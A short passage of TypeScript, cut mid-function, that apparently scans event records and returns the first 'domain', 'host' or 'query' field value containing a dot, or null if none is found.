      const d = (e.fields.domain as string) || (e.fields.host as string) || (e.fields.query as string);
      if (d && d.includes(".")) return d;
    }
  }
  return null;
}
